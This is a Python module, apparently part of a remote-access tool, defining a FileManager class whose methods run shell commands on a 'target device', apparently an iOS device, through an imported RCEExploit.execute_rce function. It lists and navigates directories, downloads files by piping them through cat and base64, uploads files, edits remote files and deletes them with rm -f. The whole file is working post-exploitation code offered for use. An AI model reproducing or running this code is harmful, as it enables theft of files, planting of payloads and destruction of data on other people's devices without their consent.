import os
import base64
import time
from rich.console import Console
from rich.prompt import Prompt
from rce_exploit import RCEExploit

console = Console()

class FileManager:
    @staticmethod
    def ls(ip, port, directory="."):
        """List directory contents."""
        try:
            # أمر ls -la متوافق مع iOS
            command = f"ls -la {directory}"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][File] Directory Contents ({directory}):[/bold green]\n{result['response']}")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][File] Failed to list directory: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][File] Directory listing error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def cd(ip, port, directory):
        """Change directory (simulated by tracking current directory)."""
        try:
            # أمر cd متوافق مع iOS
            command = f"cd {directory} && pwd"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][File] Changed to directory: {result['response']}[/bold green]")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][File] Failed to change directory: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][File] Directory change error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def pwd(ip, port):
        """Print current working directory."""
        try:
            # أمر pwd متوافق مع iOS
            command = "pwd"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][File] Current Directory: {result['response']}[/bold green]")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][File] Failed to get current directory: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][File] Current directory error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def download(ip, port, remote_path):
        """Download a file from the target device."""
        try:
            # أمر cat و base64 متوافق مع iOS
            # في iOS العادي يمكن استخدام Files app أو تطبيقات مثل Documents by Readdle
            command = f"cat {remote_path} | base64"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success' and result['response']:
                file_data = base64.b64decode(result['response'])
                os.makedirs("Download", exist_ok=True)
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                filename = f"Download/{os.path.basename(remote_path)}_{timestamp}"
                with open(filename, "wb") as f:
                    f.write(file_data)
                console.print(f"[bold green][File] File downloaded to {filename}[/bold green]")
                return {'status': 'success', 'filename': filename}
            else:
                console.print(f"[bold red][File] Failed to download file: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][File] Download error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def upload(ip, port, local_path):
        """Upload a file to the target device."""
        try:
            if not os.path.exists(local_path):
                console.print(f"[bold red][File] Local file {local_path} not found[/bold red]")
                return {'status': 'error', 'error': 'File not found'}
            with open(local_path, "rb") as f:
                file_data = base64.b64encode(f.read()).decode()
            remote_path = Prompt.ask("[bold cyan]Enter remote file path[/bold cyan]")
            # أمر echo و base64 متوافق مع iOS
            # في iOS العادي يمكن استخدام Files app أو تطبيقات مثل Documents by Readdle
            command = f"echo {file_data} | base64 -d > {remote_path}"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][File] File uploaded to {remote_path}[/bold green]")
                return {'status': 'success'}
            else:
                console.print(f"[bold red][File] Failed to upload file: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][File] Upload error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def rm(ip, port, file_path):
        """Delete a file from the target device."""
        try:
            # أمر rm متوافق مع iOS
            command = f"rm -f {file_path}"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][File] File {file_path} deleted successfully[/bold green]")
                return {'status': 'success'}
            else:
                console.print(f"[bold red][File] Failed to delete file: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][File] File deletion error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def edit(ip, port, file_path):
        """Edit a file on the target device using a simple editor."""
        try:
            # تنزيل الملف أولاً
            result = FileManager.download(ip, port, file_path)
            if result['status'] != 'success':
                return result
            local_file = result['filename']
            # فتح محرر محلي (محاكاة باستخدام الإدخال)
            # في iOS يمكن استخدام تطبيقات مثل Textastic أو iA Writer
            console.print(f"[bold yellow][File] Editing {file_path}. Enter new content (Ctrl+D or empty line to finish):[/bold yellow]")
            new_content = []
            while True:
                line = Prompt.ask("> ", default="")
                if not line:
                    break
                new_content.append(line)
            new_content = "\n".join(new_content)
            with open(local_file, "w") as f:
                f.write(new_content)
            # رفع الملف المعدل مرة أخرى
            return FileManager.upload(ip, port, local_file)
        except Exception as e:
            console.print(f"[bold red][File] File edit error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def mkdir(ip, port, dir_name):
        """Create a directory on the target device."""
        try:
            # أمر mkdir متوافق مع iOS
            command = f"mkdir -p {dir_name}"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][File] Directory {dir_name} created successfully[/bold green]")
                return {'status': 'success'}
            else:
                console.print(f"[bold red][File] Failed to create directory: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][File] Directory creation error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}
